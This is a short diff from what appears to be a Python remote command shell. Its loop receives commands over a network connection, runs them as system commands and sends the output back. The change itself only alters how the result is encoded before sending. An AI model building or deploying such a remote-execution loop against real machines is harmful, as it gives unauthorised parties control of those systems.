@@ -18,6 +18,6 @@ while True:
         break
     
     result = execute_system_command(command)
-    connection.send(str(result, 'utf-8'))
+    connection.send(result)
 
 connection.close()
